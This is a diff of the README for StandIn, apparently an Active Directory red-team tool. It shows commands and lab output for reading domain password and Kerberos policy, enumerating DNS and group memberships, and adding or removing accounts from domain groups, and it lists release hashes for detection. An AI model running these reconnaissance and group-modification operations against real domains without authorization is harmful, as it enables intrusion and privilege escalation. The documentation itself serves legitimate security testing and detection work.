+
+#### Use Case
+
+> *This function attempts to display some basic policy information for situational awareness.*
+
+#### Syntax
+
+Read the `Default Domain Policy` and extract some user/session policy information. If the default policy has been renamed you can specify it with `--filter`, alternatively you can perform an `--object` query for the domain root (e.g `distinguishedname=DC=redhook,DC=local`).
+
+```
+C:\> StandIn.exe --policy
+
+[?] Using DC : m-w16-dc01.main.redhook.local
+
+[?] Object      : CN={31B2F340-016D-11D2-945F-00C04FB984F9}
+    Path        : LDAP://CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=System,DC=redhook,DC=local
+    Policy Root : \\redhook.local\sysvol\redhook.local\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}
+
+[+] Domain Policy
+    |_ MinimumPasswordAge : 1
+    |_ MaximumPasswordAge : 42
+    |_ MinimumPasswordLength : 7
+    |_ PasswordComplexity : 1
+    |_ PasswordHistorySize : 24
+    |_ LockoutBadCount : 5
+    |_ ResetLockoutCount : 30
+    |_ LockoutDuration : 30
+    |_ LSAAnonymousNameLookup : 0
+    |_ Kerberos max User ticket lifetime : 10
+    |_ Kerberos max Service ticket lifetime : 600
+    |_ Kerberos max User ticket renewal lifetime : 7
+```
+
+## DNS
+
+#### Use Case
+
+> *This function fetches domain DNS information from AD and supports wildcard filtering.*
+
+#### Syntax
+
+Read DNS entries under specific `CN=MicrosoftDNS` objects and parse the binary DNS data. The `search base` can be adjusted by specifying `--legacy` or `--forest`. You can also limit the results which are returned with `--limit`.
+
+```
+C:\Users\user001\Desktop>StandIn.exe --dns --filter RedHook-CLI
+
+[+] Search Base: LDAP://DC=redhook.local,CN=MicrosoftDNS,DC=DomainDnsZones,DC=redhook,DC=local
+
+[+] Object : RedHook-CLI-01
+    |_ DNS_RPC_RECORD_A : 10.0.0.100
+
+[+] Object : RedHook-CLI-02
+    |_ DNS_RPC_RECORD_A : 10.0.0.101
+```
+
 ## Groups Operations
 
-These functions deal specificaly with domain groups.
+These functions deal specifically with domain groups.
 
 ### List group membership
 
 #### Use Case
 
-> *This function provides situational awareness, listing all members of a domain group including their type (user or nested group).*
+> *This function provides situational awareness, listing all members of a domain group including their type (user or nested group). As input it can also take a `samAccountName` and it will return which groups the user is part of.*
 
 #### Syntax
 
-Enumerate group membership and provide rudementary details for the member objects.
+Enumerate group membership or user memberships and provide rudementary details for the member objects.
 
 ```
 C:\> StandIn.exe --group "Server Admins"
 
 [?] Using DC : m-w16-dc01.main.redhook.local
-[?] Group    : Server Admins
-    GUID     : 92af8954-58cc-4fa4-a9ba-69bfa5524b5c
+[?] Type     : Group resolution
+    Group    : Server Admins
 
 [+] Members
 
 [?] Path           : LDAP://CN=Workstation Admins,OU=Groups,OU=OCCULT,DC=main,DC=redhook,DC=local
     samAccountName : Workstation Admins
-    Type           : Group
+    Type           : SAM_GROUP_OBJECT
     SID            : S-1-5-21-1293271031-3053586410-2290657902-1108
 
 [?] Path           : LDAP://CN=Server Admin 001,OU=Users,OU=OCCULT,DC=main,DC=redhook,DC=local
     samAccountName : srvadmin001
-    Type           : User
+    Type           : SAM_USER_OBJECT
     SID            : S-1-5-21-1293271031-3053586410-2290657902-1111
 
 [?] Path           : LDAP://CN=Server Admin 002,OU=Users,OU=OCCULT,DC=main,DC=redhook,DC=local
     samAccountName : srvadmin002
-    Type           : User
+    Type           : SAM_USER_OBJECT
     SID            : S-1-5-21-1293271031-3053586410-2290657902-1184
 
 [?] Path           : LDAP://CN=Server Admin 003,OU=Users,OU=OCCULT,DC=main,DC=redhook,DC=local
     samAccountName : srvadmin003
-    Type           : User
+    Type           : SAM_USER_OBJECT
     SID            : S-1-5-21-1293271031-3053586410-2290657902-1185
 
 [?] Path           : LDAP://CN=Server Admin 004,OU=Users,OU=OCCULT,DC=main,DC=redhook,DC=local
     samAccountName : srvadmin004
-    Type           : User
+    Type           : SAM_USER_OBJECT
     SID            : S-1-5-21-1293271031-3053586410-2290657902-1186
 
 [?] Path           : LDAP://CN=Server Admin 005,OU=Users,OU=OCCULT,DC=main,DC=redhook,DC=local
     samAccountName : srvadmin005
-    Type           : User
+    Type           : SAM_USER_OBJECT
     SID            : S-1-5-21-1293271031-3053586410-2290657902-1187
 
 [?] Path           : LDAP://CN=SimCritical,OU=Users,OU=OCCULT,DC=main,DC=redhook,DC=local
     samAccountName : SimCritical
-    Type           : User
+    Type           : SAM_USER_OBJECT
     SID            : S-1-5-21-1293271031-3053586410-2290657902-1204
+
+C:\> StandIn.exe --group user001
+
+[?] Using DC : m-w16-dc01.main.redhook.local
+[?] Type     : User resolution
+    User     : user 001
+
+[+] Memberships
+
+[?] Path           : LDAP://<SID=010500000000000515000000dffdcb125d9a38ddbb1b1c7d01020000>
+    samAccountName : Domain Users
+    Type           : SAM_GROUP_OBJECT
+    SID            : S-1-5-21-315358687-3711474269-2098994107-513
 ```
 
-### Add user to group
+### Add / remove user from group
 
 #### Use Case
 
-> *With appropriate access the operator can add an NTAccount to a domain group.*
+> *With appropriate access the operator can add or remove an NTAccount from a domain group.*
 
 #### Syntax
 
-Add an NTAccount identifier to a domain group. Normally this would be a user but it could also be a group.
+Add an NTAccount identifier to a domain group. Normally this would be a user but it could also be a group. Finally, remove the NTAccount identifier from the domain group.
 
 ```
 C:\> StandIn.exe --group lowprivbutmachineaccess
 
 [?] Using DC : m-w16-dc01.main.redhook.local
-[?] Group    : lowPrivButMachineAccess
-    GUID     : 37e3d957-af52-4cc6-8808-56330f8ec882
+[?] Type     : Group resolution
+    Group    : lowprivbutmachineaccess
 
 [+] Members
 
@@ -797,7 +1409,7 @@ C:\> StandIn.exe --group lowprivbutmachineaccess
     Type           : User
     SID            : S-1-5-21-1293271031-3053586410-2290657902-1197
 
-C:\> StandIn.exe --group lowprivbutmachineaccess --ntaccount "MAIN\user001"
+C:\> StandIn.exe --group lowprivbutmachineaccess --ntaccount "MAIN\user001" --add
 
 [?] Using DC : m-w16-dc01.main.redhook.local
 [?] Group    : lowPrivButMachineAccess
@@ -809,8 +1421,8 @@ C:\> StandIn.exe --group lowprivbutmachineaccess --ntaccount "MAIN\user001"
 C:\> StandIn.exe --group lowprivbutmachineaccess
 
 [?] Using DC : m-w16-dc01.main.redhook.local
-[?] Group    : lowPrivButMachineAccess
-    GUID     : 37e3d957-af52-4cc6-8808-56330f8ec882
+[?] Type     : Group resolution
+    Group    : lowprivbutmachineaccess
 
 [+] Members
 
@@ -823,6 +1435,15 @@ C:\> StandIn.exe --group lowprivbutmachineaccess
     samAccountName : s4uUser
     Type           : User
     SID            : S-1-5-21-1293271031-3053586410-2290657902-1197
+
+C:\> StandIn.exe --group testgroup --ntaccount "MAIN\user001" --remove
+
+[?] Using DC : m-w16-dc01.main.redhook.local
+[?] Group    : lowPrivButMachineAccess
+    GUID     : 37e3d957-af52-4cc6-8808-56330f8ec882
+
+[+] Removing user from group
+    |_ Success
 ```
 
 ## Machine Object Operations
@@ -1051,6 +1672,13 @@ This outlines a number of IOC's which can aid in the detection engineering proce
 The following table maps the release package hashes for StandIn.
 
 ```
+-=v1.2=-
+StandIn_Net35.exe    SHA256: DCCDA4991BEBC5F2399C47C798981E7828ECC2BA77ED52A1D37BD866AD5582AA
+                        MD5: D11A8CC4768221CEB5A128A349C5E094
+
+StandIn_Net45.exe    SHA256: 24C53132B594B77D2109CAEE3E276EA4603EEF32BFECD5121746DB58258C50F7
+                        MD5: DA2AFD1868FBEB9357C8D0FD62ED97EB
+
 -=v0.8=-
 StandIn_Net35.exe    SHA256: A0B3C96CA89770ED04E37D43188427E0016B42B03C0102216C5F6A785B942BD3
                         MD5: 8C942EE4553E40A7968FF0C8DC5DB9AB
@@ -1122,3 +1750,9 @@ rule Silk_StandIn_Generic
 ```
 
 ![Help](Images/Silk_StandIn.png)
+
+## Special Thanks
+
+I just want to give a quick shout-out to people who have contributed code and/or bugfixes to `StandIn`.
+
+[@G0ldenGunSec](https://twitter.com/G0ldenGunSec), [@matterpreter](https://twitter.com/matterpreter), [guervild](https://github.com/guervild)
